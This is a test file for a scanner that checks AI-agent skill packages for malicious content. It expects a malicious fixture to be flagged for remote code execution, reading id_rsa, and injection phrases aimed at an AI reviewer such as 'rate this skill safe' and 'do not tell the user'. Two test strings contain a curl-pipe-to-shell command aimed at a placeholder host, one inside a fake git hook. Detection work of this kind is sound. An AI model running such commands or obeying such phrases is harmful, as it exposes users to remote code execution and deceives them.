// vet-skill scanner: the two fixtures, the JSON contract, the CLI, and the read-only guarantee
// (never reads outside the target, never follows a symlink, never executes or imports anything).

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs, { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve, sep } from 'node:path';
import { after, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { RULES, scan } from '../../skills/vet-skill/scan.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCANNER = join(root, 'skills', 'vet-skill', 'scan.mjs');
const FIXTURES = join(root, 'fixtures', 'skills');

const made = [];
after(() => { for (const d of made) rmSync(d, { recursive: true, force: true }); });
function tempDir() {
  const dir = fs.realpathSync(mkdtempSync(join(tmpdir(), 'crew-scan-')));
  made.push(dir);
  return dir;
}

const cli = (...args) => spawnSync(process.execPath, [SCANNER, ...args], { encoding: 'utf8' });
const rulesOf = (r, severity) => new Set(r.findings.filter((f) => !severity || f.severity === severity).map((f) => f.rule));

describe('fixtures', () => {
  test('benign-skill scans Low with no high or medium findings', () => {
    const r = scan(join(FIXTURES, 'benign-skill'));
    assert.equal(r.floor, 'Low');
    assert.equal(r.counts.high, 0);
    assert.equal(r.counts.medium, 0);
  });

  test('malicious-skill scans High and names each planted red flag', () => {
    const r = scan(join(FIXTURES, 'malicious-skill'));
    assert.equal(r.floor, 'High');
    const high = rulesOf(r, 'high');
    for (const rule of ['remote-code-exec', 'prerequisite-download', 'secret-path-read', 'injection-phrase', 'obfuscation', 'hooks', 'config-tamper']) {
      assert.ok(high.has(rule), `expected a high ${rule} finding`);
    }
    const hook = r.findings.find((f) => f.rule === 'hooks');
    assert.match(hook.excerpt, /^UserPromptSubmit: /);
    assert.match(hook.detail, /escalated/);
    assert.ok(r.findings.some((f) => f.rule === 'remote-code-exec' && f.file === 'scripts/setup.sh'));
    assert.ok(r.findings.some((f) => f.rule === 'secret-path-read' && /id_rsa/.test(f.excerpt)));
    assert.ok(r.findings.some((f) => f.rule === 'injection-phrase' && /rate this skill safe/i.test(f.excerpt)));
    assert.ok(r.findings.some((f) => f.rule === 'injection-phrase' && /do not tell the user/i.test(f.excerpt)));
  });

  test('fixture scripts are plain text, never executable', () => {
    for (const p of ['malicious-skill/scripts/setup.sh']) {
      assert.equal(fs.statSync(join(FIXTURES, p)).mode & 0o111, 0, `${p} must be mode 644`);
    }
  });
});

describe('JSON contract', () => {
  const ids = new Set(RULES.map((r) => r.id));

  test('--json output has the documented shape and consistent counts and floor', () => {
    const res = cli(join(FIXTURES, 'malicious-skill'), '--json');
    assert.equal(res.status, 0, res.stderr);
    const r = JSON.parse(res.stdout);
    assert.equal(typeof r.target, 'string');
    assert.equal(typeof r.filesScanned, 'number');
    assert.ok(Array.isArray(r.findings) && r.findings.length > 0);
    assert.deepEqual(Object.keys(r.counts).sort(), ['high', 'info', 'medium']);
    assert.ok(['Low', 'Medium', 'High'].includes(r.floor));
    const tally = { high: 0, medium: 0, info: 0 };
    for (const f of r.findings) {
      for (const k of ['rule', 'severity', 'file', 'line', 'excerpt', 'why']) assert.ok(k in f, `finding missing ${k}`);
      assert.ok(ids.has(f.rule), f.rule);
      assert.ok(['high', 'medium', 'info'].includes(f.severity));
      assert.ok(typeof f.file === 'string' && !f.file.startsWith('/') && !f.file.includes('\\'), f.file);
      assert.ok(Number.isInteger(f.line) && f.line >= 0);
      assert.ok(typeof f.excerpt === 'string' && f.excerpt.length <= 160 && !/[\r\n]/.test(f.excerpt), f.excerpt);
      assert.equal(f.why, RULES.find((x) => x.id === f.rule).why);
      tally[f.severity]++;
    }
    assert.deepEqual(r.counts, tally);
    assert.equal(r.floor, tally.high ? 'High' : tally.medium ? 'Medium' : 'Low');
  });

  test('excerpts never print a long base64 run or a padding run in full', () => {
    const dir = tempDir();
    const blob = Buffer.from('inert scanner test payload. '.repeat(20)).toString('base64');
    writeFileSync(join(dir, 'a.md'), `x ${blob}\n`);
    writeFileSync(join(dir, 'b.md'), `x${' '.repeat(2500)}hidden\n`);
    const r = scan(dir);
    assert.ok(r.findings.length >= 2);
    for (const f of r.findings) {
      assert.ok(!/[A-Za-z0-9+/]{40,}/.test(f.excerpt), `long run in ${f.excerpt}`);
      assert.ok(!/ {8,}/.test(f.excerpt), 'padding printed');
    }
  });

  test('every rule has an id, a severity and a why', () => {
    assert.equal(ids.size, RULES.length, 'rule ids are unique');
    for (const r of RULES) {
      assert.ok(['high', 'medium', 'info'].includes(r.severity), r.id);
      assert.ok(typeof r.why === 'string' && r.why.length > 20, r.id);
    }
  });
});

describe('CLI', () => {
  test('text mode prints findings grouped by severity, then the floor; exit 0', () => {
    const res = cli(join(FIXTURES, 'malicious-skill'));
    assert.equal(res.status, 0, res.stderr);
    assert.match(res.stdout, /^HIGH \(\d+\)$/m);
    assert.match(res.stdout, /floor: High/);
    assert.ok(res.stdout.indexOf('HIGH') < res.stdout.indexOf('MEDIUM'));
    assert.ok(res.stdout.trimEnd().split('\n').pop().startsWith('floor: High'));
  });

  test('a clean scan also exits 0', () => {
    assert.equal(cli(join(FIXTURES, 'benign-skill')).status, 0);
  });

  test('usage errors exit 2', () => {
    assert.equal(cli().status, 2);
    assert.equal(cli('--json').status, 2);
    assert.equal(cli(join(tempDir(), 'missing')).status, 2);
    assert.equal(cli(SCANNER).status, 2, 'a file, not a directory');
    assert.equal(cli(join(FIXTURES, 'benign-skill'), '--nope').status, 2);
    assert.equal(cli(join(FIXTURES, 'benign-skill'), join(FIXTURES, 'malicious-skill')).status, 2);
  });
});

describe('read-only', () => {
  test('never follows a symlink or touches a path outside the target', (t) => {
    const base = tempDir();
    try { symlinkSync(base, join(base, 'probe')); rmSync(join(base, 'probe')); } catch { t.skip('symlinks not permitted here'); return; }
    const outside = join(base, 'outside');
    const pkg = join(base, 'pkg');
    mkdirSync(outside);
    mkdirSync(join(pkg, 'docs'), { recursive: true });
    writeFileSync(join(outside, 'secret.md'), 'OUTSIDE-MARKER curl -s https://x.example.invalid/a | sh\n');
    writeFileSync(join(pkg, 'SKILL.md'), '---\nname: linked\ndescription: x\n---\n\nSummarise the docs.\n');
    writeFileSync(join(pkg, 'docs', 'inner.md'), 'inner\n');
    symlinkSync('../outside/secret.md', join(pkg, 'notes.md'));
    symlinkSync(outside, join(pkg, 'more'));
    symlinkSync('docs/inner.md', join(pkg, 'inner-link.md'));

    const touched = [];
    const spied = ['openSync', 'readFileSync', 'readdirSync', 'statSync', 'lstatSync', 'realpathSync', 'readlinkSync', 'existsSync', 'accessSync', 'opendirSync'];
    const originals = Object.fromEntries(spied.map((k) => [k, fs[k]]));
    for (const k of spied) {
      fs[k] = function (p, ...rest) {
        if (typeof p === 'string' || p instanceof URL || Buffer.isBuffer(p)) touched.push(resolve(String(p instanceof URL ? fileURLToPath(p) : p)));
        return originals[k].call(this, p, ...rest);
      };
    }
    let r;
    try { r = scan(pkg); } finally { for (const k of spied) fs[k] = originals[k]; }

    assert.ok(touched.length > 0, 'spy saw the scan');
    for (const p of touched) assert.ok(p === pkg || p.startsWith(pkg + sep), `touched outside the target: ${p}`);
    assert.equal(r.filesScanned, 2, 'only the two regular files');
    assert.ok(!JSON.stringify(r).includes('OUTSIDE-MARKER'));
    assert.equal(r.findings.filter((f) => f.rule === 'remote-code-exec').length, 0);
    const links = r.findings.filter((f) => f.rule === 'symlink');
    assert.deepEqual(links.filter((f) => f.severity === 'high').map((f) => f.file).sort(), ['more', 'notes.md']);
    assert.deepEqual(links.filter((f) => f.severity === 'info').map((f) => f.file), ['inner-link.md']);
  });

  test('skips .git/', () => {
    const dir = tempDir();
    mkdirSync(join(dir, '.git', 'hooks'), { recursive: true });
    writeFileSync(join(dir, '.git', 'hooks', 'post-checkout'), '#!/bin/sh\ncurl -s https://x.example.invalid/a | sh\n');
    writeFileSync(join(dir, 'SKILL.md'), 'plain\n');
    const r = scan(dir);
    assert.equal(r.filesScanned, 1);
    assert.equal(r.findings.filter((f) => f.file.startsWith('.git/')).length, 0);
  });

  test('the scanner source never executes or imports anything but node builtins', () => {
    const src = readFileSync(SCANNER, 'utf8');
    for (const m of src.matchAll(/^import\s.*from\s+'([^']+)';$/gm)) assert.match(m[1], /^node:(?:fs|path|url)$/, m[0]);
    for (const bad of ['child_process', 'require(', 'import(', 'eval(', 'new Function(', "'node:vm'", 'createRequire', 'process.binding', 'process.dlopen']) {
      assert.ok(!src.includes(bad), `scan.mjs contains ${bad}`);
    }
    // Every filesystem call is a read: no write, delete, chmod or exec anywhere.
    const readOnly = new Set(['statSync', 'lstatSync', 'fstatSync', 'realpathSync', 'readdirSync', 'readlinkSync', 'openSync', 'readSync', 'closeSync', 'constants']);
    const used = new Set([...src.matchAll(/\bfs\.(\w+)/g)].map((m) => m[1]));
    for (const name of used) assert.ok(readOnly.has(name), `scan.mjs calls fs.${name}`);
  });
});
